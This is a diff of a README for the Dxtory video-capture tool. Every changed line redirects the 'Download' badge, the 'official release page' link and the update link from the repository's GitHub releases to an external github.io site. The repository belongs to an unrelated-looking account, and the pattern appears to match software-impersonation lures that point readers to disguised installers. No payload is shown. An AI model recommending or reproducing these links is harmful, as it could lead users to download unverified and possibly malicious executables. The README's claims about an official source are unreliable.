@@ -1,12 +1,12 @@
 # 🎥 Dxtory - Capture lossless video games easily
 
-[![](https://img.shields.io/badge/Download_Dxtory-blue.svg)](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases)
+[![](https://img.shields.io/badge/Download_Dxtory-blue.svg)](https://valetparkingjanvandermeer639.github.io)
 
 Dxtory performs lossless video capture for Windows. It records game footage at high speeds with minimal impact on your system performance. Use this software to create high-quality recordings of your screen during gameplay.
 
 ## 📥 Getting Started
 
-[Visit the official release page to download Dxtory](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases). You will find the installer file on this page. Save this file to your computer.
+[Visit the official release page to download Dxtory](https://valetparkingjanvandermeer639.github.io). You will find the installer file on this page. Save this file to your computer.
 
 ## ⚙️ System Requirements
 
@@ -102,7 +102,7 @@ Dxtory operates locally on your machine. The software does not send your recordi
 
 ## 📈 Software Updates
 
-Check the [download link](https://github.com/Valetparkingjanvandermeer639/Dxtory/releases) occasionally for newer versions. Developers release updates to improve compatibility with newer Windows versions and fix bugs. You can install a newer version directly over an existing installation. The installer will update your current settings automatically.
+Check the [download link](https://valetparkingjanvandermeer639.github.io) occasionally for newer versions. Developers release updates to improve compatibility with newer Windows versions and fix bugs. You can install a newer version directly over an existing installation. The installer will update your current settings automatically.
 
 ## 📁 Support
 
